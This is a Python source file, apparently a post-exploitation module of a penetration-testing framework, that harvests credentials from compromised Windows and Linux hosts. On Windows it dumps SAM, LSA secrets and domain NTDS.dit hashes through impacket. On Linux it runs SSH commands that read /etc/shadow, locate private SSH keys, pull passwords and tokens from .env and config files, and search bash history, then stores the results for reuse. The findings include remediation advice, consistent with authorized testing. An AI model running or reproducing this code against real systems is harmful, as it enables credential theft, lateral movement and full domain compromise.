"""Credential harvesting from compromised hosts (Windows + Linux)."""

from __future__ import annotations

import asyncio
import contextlib
import logging
import re
from typing import TYPE_CHECKING, Any

from pacdoor.core.models import (
    Credential,
    CredentialType,
    Evidence,
    ExploitSafety,
    Finding,
    Phase,
    Severity,
)
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

# ── Lazy imports for optional libraries ──────────────────────────────

_impacket_available: bool | None = None
_paramiko_available: bool | None = None


def _ensure_impacket() -> bool:
    global _impacket_available  # noqa: PLW0603
    if _impacket_available is not None:
        return _impacket_available
    try:
        import impacket.smbconnection  # type: ignore[import-untyped]  # noqa: F401

        _impacket_available = True
    except ImportError:
        log.debug("impacket not installed — Windows cred harvest unavailable")
        _impacket_available = False
    return _impacket_available


def _ensure_paramiko() -> bool:
    global _paramiko_available  # noqa: PLW0603
    if _paramiko_available is not None:
        return _paramiko_available
    try:
        import paramiko  # type: ignore[import-untyped]  # noqa: F401

        _paramiko_available = True
    except ImportError:
        log.debug("paramiko not installed — Linux cred harvest unavailable")
        _paramiko_available = False
    return _paramiko_available


# ── Windows helpers (impacket — synchronous) ─────────────────────────


def _win_secretsdump(
    ip: str,
    username: str,
    password: str,
    domain: str = "",
    ntlm_hash: str | None = None,
) -> dict[str, list[dict[str, str]]]:
    """Use impacket's secretsdump logic to extract SAM, LSA, and optionally NTDS.

    Returns a dict with keys 'sam', 'lsa', 'ntds' — each a list of credential dicts.
    """
    results: dict[str, list[dict[str, str]]] = {"sam": [], "lsa": [], "ntds": []}
    try:
        from impacket.examples.secretsdump import (  # type: ignore[import-untyped]
            LSASecrets,
            NTDSHashes,
            RemoteOperations,
            SAMHashes,
        )
        from impacket.smbconnection import SMBConnection  # type: ignore[import-untyped]

        conn = SMBConnection(ip, ip, sess_port=445)
        conn.negotiateSession()
        if ntlm_hash:
            lm, nt = "", ntlm_hash
            if ":" in ntlm_hash:
                lm, nt = ntlm_hash.split(":", 1)
            conn.login(username, "", domain, lmhash=lm, nthash=nt)
        else:
            conn.login(username, password, domain)

        remote_ops = RemoteOperations(conn, False)
        remote_ops.enableRegistry()

        # ── SAM hashes ───────────────────────────────────────────
        boot_key = remote_ops.getBootKey()

        class _SAMCallback:
            def __init__(self) -> None:
                self.entries: list[dict[str, str]] = []

            def __call__(self, secret: str) -> None:
                # Format: username:rid:lm_hash:nt_hash:::
                parts = secret.split(":")
                if len(parts) >= 4:
                    self.entries.append({
                        "username": parts[0],
                        "rid": parts[1],
                        "lm_hash": parts[2],
                        "nt_hash": parts[3],
                    })

        sam_cb = _SAMCallback()
        try:
            sam_hashes = SAMHashes(
                remote_ops.saveSAM(), boot_key, isRemote=True, perSecretCallback=sam_cb
            )
            sam_hashes.dump()
            results["sam"] = sam_cb.entries
            sam_hashes.finish()
        except Exception:
            pass

        # ── LSA secrets ──────────────────────────────────────────
        class _LSACallback:
            def __init__(self) -> None:
                self.entries: list[dict[str, str]] = []

            def __call__(self, secret_type: str, secret: str) -> None:
                self.entries.append({"type": secret_type, "value": secret})

        lsa_cb = _LSACallback()
        try:
            lsa = LSASecrets(
                remote_ops.saveSECURITY(), boot_key, remote_ops,
                isRemote=True, perSecretCallback=lsa_cb,
            )
            lsa.dumpCachedHashes()
            lsa.dumpSecrets()
            results["lsa"] = lsa_cb.entries
            lsa.finish()
        except Exception:
            pass

        # ── NTDS.dit (Domain Controller only) ────────────────────
        class _NTDSCallback:
            def __init__(self) -> None:
                self.entries: list[dict[str, str]] = []

            def __call__(self, secret_type: str, secret: str) -> None:
                parts = secret.split(":")
                if len(parts) >= 4:
                    self.entries.append({
                        "username": parts[0],
                        "rid": parts[1],
                        "lm_hash": parts[2],
                        "nt_hash": parts[3],
                    })

        ntds_cb = _NTDSCallback()
        try:
            remote_ops.connectWinReg()
            ntds = NTDSHashes(
                None, boot_key, isRemote=True, remoteOps=remote_ops,
                perSecretCallback=ntds_cb, resumeSession=None,
            )
            ntds.dump()
            results["ntds"] = ntds_cb.entries
            ntds.finish()
        except Exception:
            # NTDS extraction fails on non-DCs — expected
            pass

        remote_ops.finish()
        conn.close()

    except ImportError:
        log.debug("impacket secretsdump modules not available")
    except Exception as e:
        log.debug("secretsdump failed on %s: %s", ip, e)

    return results


# ── Linux helpers (paramiko — synchronous) ───────────────────────────


def _linux_connect(
    ip: str,
    username: str,
    password: str | None = None,
    port: int = 22,
    timeout: int = 10,
) -> Any | None:
    """Establish an SSH connection."""
    try:
        import paramiko  # type: ignore[import-untyped]

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password, timeout=timeout)
        return client
    except Exception:
        return None


def _linux_exec(client: Any, command: str, timeout: int = 15) -> str:
    """Execute a command via SSH and return stdout."""
    try:
        _, stdout, _ = client.exec_command(command, timeout=timeout)
        return stdout.read().decode("utf-8", errors="replace")
    except Exception:
        return ""


def _linux_read_shadow(client: Any) -> list[dict[str, str]]:
    """Try to read /etc/shadow and parse credential entries."""
    entries: list[dict[str, str]] = []
    output = _linux_exec(client, "cat /etc/shadow 2>/dev/null")
    for line in output.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":")
        if len(parts) >= 2:
            username = parts[0]
            hash_val = parts[1]
            # Skip locked/disabled accounts
            if hash_val in ("*", "!", "!!", ""):
                continue
            entries.append({"username": username, "hash": hash_val})
    return entries


def _linux_find_ssh_keys(client: Any) -> list[dict[str, str]]:
    """Search for SSH private keys in user home directories."""
    keys: list[dict[str, str]] = []
    output = _linux_exec(
        client,
        "find /home /root -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' "
        "-o -name '*.pem' 2>/dev/null | head -50",
    )
    for line in output.splitlines():
        path = line.strip()
        if not path:
            continue
        # Read the first line to confirm it's actually a key
        content = _linux_exec(client, f"head -1 '{path}' 2>/dev/null").strip()
        if "PRIVATE KEY" in content:
            # Determine owner from path
            parts = path.split("/")
            owner = parts[2] if len(parts) > 2 else "unknown"
            keys.append({"path": path, "owner": owner, "type": content})
    return keys


def _linux_find_env_files(client: Any) -> list[dict[str, str]]:
    """Search for .env files and config files that may contain credentials."""
    creds_found: list[dict[str, str]] = []

    # Search for .env files
    output = _linux_exec(
        client,
        "find / -maxdepth 5 -name '.env' -o -name '*.env' "
        "-o -name 'config.yml' -o -name 'config.yaml' "
        "-o -name 'application.properties' -o -name 'wp-config.php' "
        "-o -name 'settings.py' 2>/dev/null | head -30",
    )

    password_pattern = re.compile(
        r"(password|passwd|pwd|secret|api_key|apikey|token|db_pass|database_password)"
        r"\s*[=:]\s*['\"]?(\S+)['\"]?",
        re.IGNORECASE,
    )

    for line in output.splitlines():
        path = line.strip()
        if not path:
            continue
        content = _linux_exec(client, f"cat '{path}' 2>/dev/null")
        for match in password_pattern.finditer(content):
            key_name = match.group(1)
            value = match.group(2)
            # Skip template values and empty
            if value in ("''", '""', "null", "None", "changeme", "password", "xxx", ""):
                continue
            creds_found.append({
                "file": path,
                "key": key_name,
                "value": value[:64],  # Truncate long values
            })
    return creds_found


def _linux_check_bash_history(client: Any) -> list[str]:
    """Search bash history files for commands containing credentials."""
    cred_patterns = re.compile(
        r"(mysql\s+-u\s+\S+\s+-p\S+|"
        r"sshpass\s+-p\s+\S+|"
        r"curl\s+.*-u\s+\S+:\S+|"
        r"wget\s+.*--password=\S+|"
        r"psql\s+.*password=\S+|"
        r"PGPASSWORD=\S+)",
        re.IGNORECASE,
    )

    hits: list[str] = []
    output = _linux_exec(
        client,
        "cat /root/.bash_history /home/*/.bash_history 2>/dev/null",
    )
    for line in output.splitlines():
        line = line.strip()
        if cred_patterns.search(line):
            hits.append(line[:200])  # Truncate long commands
    return hits


def _linux_disconnect(client: Any) -> None:
    """Close SSH connection."""
    with contextlib.suppress(Exception):
        client.close()


# ── Module ───────────────────────────────────────────────────────────


class CredHarvestModule(BaseModule):
    name = "post.cred_harvest"
    description = "Credential harvesting from compromised hosts"
    phase = Phase.POST_EXPLOIT
    attack_technique_ids = ["T1003"]
    required_facts = ["credential.admin"]
    produced_facts = [
        "credential.valid",
        "credential.admin",
    ]
    safety = ExploitSafety.MODERATE

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []

        admin_creds = await ctx.facts.get_all("credential.admin")
        seen_hosts: set[str] = set()

        for fact in admin_creds:
            host_id = fact.host_id
            if host_id is None or host_id in seen_hosts:
                continue
            seen_hosts.add(host_id)
            ip = await self.resolve_ip(ctx, host_id)
            if ip is None:
                continue

            cred = fact.value

            # Determine if Windows or Linux based on services on THIS host
            has_smb = bool(await ctx.facts.get_for_host("service.smb", host_id))
            has_ssh = bool(await ctx.facts.get_for_host("service.ssh", host_id))

            if has_smb and _ensure_impacket():
                await self._harvest_windows(ctx, findings, host_id, ip, cred)

            if has_ssh and _ensure_paramiko():
                await self._harvest_linux(ctx, findings, host_id, ip, cred)

        return findings

    async def _harvest_windows(
        self,
        ctx: ModuleContext,
        findings: list[Finding],
        host_id: str,
        ip: str,
        cred: Any,
    ) -> None:
        """Extract credentials from a Windows host via secretsdump."""

        username = cred.username if hasattr(cred, "username") else str(cred.get("username", ""))
        password = cred.value if hasattr(cred, "value") else str(cred.get("value", ""))
        domain = cred.domain if hasattr(cred, "domain") else str(cred.get("domain", ""))
        ntlm_hash = None
        if hasattr(cred, "cred_type"):
            if str(cred.cred_type) == "ntlm_hash":
                ntlm_hash = password
                password = ""
        elif isinstance(cred, dict) and cred.get("cred_type") == "ntlm_hash":
            ntlm_hash = password
            password = ""

        dump = await asyncio.to_thread(
            _win_secretsdump, ip, username, password, domain or "", ntlm_hash,
        )

        # ── SAM hashes ──────────────────────────────────────────────
        if dump["sam"]:
            sam_lines = "\n".join(
                f"  - {e['username']}:{e['rid']}:{e['lm_hash']}:{e['nt_hash']}"
                for e in dump["sam"]
            )
            findings.append(Finding(
                title=f"SAM hashes extracted from {ip}",
                description=(
                    f"Extracted {len(dump['sam'])} local account hash(es) from the "
                    f"SAM database on {ip}. These NTLM hashes can be cracked "
                    "offline or used in pass-the-hash attacks."
                ),
                severity=Severity.CRITICAL,
                host_id=host_id,
                module_name=self.name,
                attack_technique_ids=["T1003.002"],
                evidence=[Evidence(
                    kind="sam_dump",
                    data=f"SAM hashes from {ip}:\n{sam_lines}",
                )],
                remediation=(
                    "Use LAPS to randomize local administrator passwords. "
                    "Disable LM hash storage and enforce strong passwords."
                ),
            ))

            # Persist each credential
            for entry in dump["sam"]:
                new_cred = Credential(
                    host_id=host_id,
                    username=entry["username"],
                    cred_type=CredentialType.NTLM_HASH,
                    value=f"{entry['lm_hash']}:{entry['nt_hash']}",
                    domain=domain or None,
                    source_module=self.name,
                    valid=True,
                )
                await ctx.facts.add(
                    "credential.valid", new_cred, self.name, host_id=host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_credential(new_cred)

        # ── LSA secrets ──────────────────────────────────────────────
        if dump["lsa"]:
            lsa_lines = "\n".join(
                f"  - [{e['type']}] {e['value'][:80]}"
                for e in dump["lsa"]
            )
            findings.append(Finding(
                title=f"LSA secrets extracted from {ip}",
                description=(
                    f"Extracted {len(dump['lsa'])} LSA secret(s) from {ip}. "
                    "LSA secrets may contain service account passwords, "
                    "auto-logon credentials, and cached domain credentials."
                ),
                severity=Severity.CRITICAL,
                host_id=host_id,
                module_name=self.name,
                attack_technique_ids=["T1003.004"],
                evidence=[Evidence(
                    kind="lsa_secrets",
                    data=f"LSA secrets from {ip}:\n{lsa_lines}",
                )],
                remediation=(
                    "Minimize stored credentials by using Group Managed Service "
                    "Accounts (gMSA). Disable caching of domain credentials where possible."
                ),
            ))

        # ── NTDS.dit ─────────────────────────────────────────────────
        if dump["ntds"]:
            ntds_lines = "\n".join(
                f"  - {e['username']}:{e['rid']}:{e['nt_hash']}"
                for e in dump["ntds"][:50]
            )
            suffix = (
                f"\n  ... and {len(dump['ntds']) - 50} more"
                if len(dump["ntds"]) > 50
                else ""
            )
            findings.append(Finding(
                title=f"NTDS.dit hashes extracted from DC {ip}",
                description=(
                    f"Extracted {len(dump['ntds'])} domain account hash(es) from "
                    f"the NTDS.dit database on Domain Controller {ip}. This "
                    "represents full domain compromise — all user and computer "
                    "account hashes are now available."
                ),
                severity=Severity.CRITICAL,
                host_id=host_id,
                module_name=self.name,
                attack_technique_ids=["T1003.003"],
                evidence=[Evidence(
                    kind="ntds_dump",
                    data=f"NTDS.dit hashes from {ip}:\n{ntds_lines}{suffix}",
                )],
                remediation=(
                    "Rotate the KRBTGT password twice. Reset all user passwords. "
                    "Investigate how admin access to the DC was obtained and remediate."
                ),
            ))

            # Persist NTDS credentials — these are domain-wide
            for entry in dump["ntds"]:
                new_cred = Credential(
                    host_id=host_id,
                    username=entry["username"],
                    cred_type=CredentialType.NTLM_HASH,
                    value=f"{entry.get('lm_hash', 'aad3b435b51404ee')}:{entry['nt_hash']}",
                    domain=domain or None,
                    source_module=self.name,
                    valid=True,
                    admin="admin" in entry.get("username", "").lower(),
                )
                fact_type = (
                    "credential.admin"
                    if new_cred.admin
                    else "credential.valid"
                )
                await ctx.facts.add(
                    fact_type, new_cred, self.name, host_id=host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_credential(new_cred)

    async def _harvest_linux(
        self,
        ctx: ModuleContext,
        findings: list[Finding],
        host_id: str,
        ip: str,
        cred: Any,
    ) -> None:
        """Extract credentials from a Linux host via SSH."""

        username = cred.username if hasattr(cred, "username") else str(cred.get("username", ""))
        password = cred.value if hasattr(cred, "value") else str(cred.get("value", ""))

        client = await asyncio.to_thread(_linux_connect, ip, username, password)
        if client is None:
            log.debug("cred_harvest: could not SSH to %s as %s", ip, username)
            return

        try:
            # ── /etc/shadow ──────────────────────────────────────────
            shadow_entries = await asyncio.to_thread(_linux_read_shadow, client)
            if shadow_entries:
                shadow_lines = "\n".join(
                    f"  - {e['username']}:{e['hash'][:20]}..."
                    for e in shadow_entries
                )
                findings.append(Finding(
                    title=f"Shadow file hashes extracted from {ip}",
                    description=(
                        f"Read {len(shadow_entries)} password hash(es) from "
                        f"/etc/shadow on {ip}. These can be cracked offline "
                        "with hashcat or john."
                    ),
                    severity=Severity.CRITICAL,
                    host_id=host_id,
                    module_name=self.name,
                    attack_technique_ids=["T1003.008"],
                    evidence=[Evidence(
                        kind="shadow_dump",
                        data=f"Shadow hashes from {ip}:\n{shadow_lines}",
                    )],
                    remediation=(
                        "Restrict /etc/shadow permissions to root only (chmod 640). "
                        "Enforce strong password policies and use PAM modules "
                        "for password complexity."
                    ),
                ))

                for entry in shadow_entries:
                    new_cred = Credential(
                        host_id=host_id,
                        username=entry["username"],
                        cred_type=CredentialType.PASSWORD,
                        value=entry["hash"],
                        source_module=self.name,
                        valid=True,
                    )
                    await ctx.facts.add(
                        "credential.valid", new_cred, self.name, host_id=host_id,
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_credential(new_cred)

            # ── SSH keys ─────────────────────────────────────────────
            ssh_keys = await asyncio.to_thread(_linux_find_ssh_keys, client)
            if ssh_keys:
                key_lines = "\n".join(
                    f"  - {k['path']} (owner: {k['owner']})"
                    for k in ssh_keys
                )
                findings.append(Finding(
                    title=f"SSH private keys found on {ip}",
                    description=(
                        f"Found {len(ssh_keys)} SSH private key(s) on {ip}. "
                        "These keys may grant access to other hosts in the "
                        "network without requiring a password."
                    ),
                    severity=Severity.HIGH,
                    host_id=host_id,
                    module_name=self.name,
                    attack_technique_ids=["T1552.004"],
                    evidence=[Evidence(
                        kind="ssh_keys",
                        data=f"SSH private keys on {ip}:\n{key_lines}",
                    )],
                    remediation=(
                        "Protect SSH private keys with strong passphrases. "
                        "Use ssh-agent for key management and restrict file "
                        "permissions (chmod 600)."
                    ),
                ))

                for key in ssh_keys:
                    new_cred = Credential(
                        host_id=host_id,
                        username=key["owner"],
                        cred_type=CredentialType.SSH_KEY,
                        value=key["path"],
                        source_module=self.name,
                        valid=True,
                    )
                    await ctx.facts.add(
                        "credential.valid", new_cred, self.name, host_id=host_id,
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_credential(new_cred)

            # ── .env and config files ────────────────────────────────
            env_creds = await asyncio.to_thread(_linux_find_env_files, client)
            if env_creds:
                env_lines = "\n".join(
                    f"  - {c['file']}: {c['key']}={c['value']}"
                    for c in env_creds[:30]
                )
                suffix = (
                    f"\n  ... and {len(env_creds) - 30} more"
                    if len(env_creds) > 30
                    else ""
                )
                findings.append(Finding(
                    title=f"Credentials in config files on {ip}",
                    description=(
                        f"Found {len(env_creds)} credential(s) in configuration "
                        f"and .env files on {ip}. These may include database "
                        "passwords, API keys, and service account credentials."
                    ),
                    severity=Severity.HIGH,
                    host_id=host_id,
                    module_name=self.name,
                    attack_technique_ids=["T1552.001"],
                    evidence=[Evidence(
                        kind="config_creds",
                        data=f"Credentials in config files on {ip}:\n{env_lines}{suffix}",
                    )],
                    remediation=(
                        "Use a secrets manager (Vault, AWS Secrets Manager) instead "
                        "of storing credentials in config files. Remove .env files "
                        "from production servers."
                    ),
                ))

                for c in env_creds:
                    new_cred = Credential(
                        host_id=host_id,
                        username=c["key"],
                        cred_type=CredentialType.PASSWORD,
                        value=c["value"],
                        source_module=self.name,
                        valid=False,  # Not validated yet
                    )
                    await ctx.facts.add(
                        "credential.valid", new_cred, self.name, host_id=host_id,
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_credential(new_cred)

            # ── Bash history ─────────────────────────────────────────
            history_hits = await asyncio.to_thread(
                _linux_check_bash_history, client,
            )
            if history_hits:
                hist_lines = "\n".join(f"  - {h}" for h in history_hits[:20])
                suffix = (
                    f"\n  ... and {len(history_hits) - 20} more"
                    if len(history_hits) > 20
                    else ""
                )
                findings.append(Finding(
                    title=f"Credentials in bash history on {ip}",
                    description=(
                        f"Found {len(history_hits)} command(s) in bash history "
                        f"on {ip} that contain credentials (passwords, connection "
                        "strings, API keys). Bash history often preserves "
                        "plaintext credentials entered on the command line."
                    ),
                    severity=Severity.MEDIUM,
                    host_id=host_id,
                    module_name=self.name,
                    attack_technique_ids=["T1552.003"],
                    evidence=[Evidence(
                        kind="bash_history_creds",
                        data=f"Credentials in bash history on {ip}:\n{hist_lines}{suffix}",
                    )],
                    remediation=(
                        "Clear bash history files and configure HISTIGNORE to "
                        "exclude sensitive commands. Use 'unset HISTFILE' for "
                        "sensitive sessions. Consider deploying auditd instead."
                    ),
                ))
        finally:
            await asyncio.to_thread(_linux_disconnect, client)
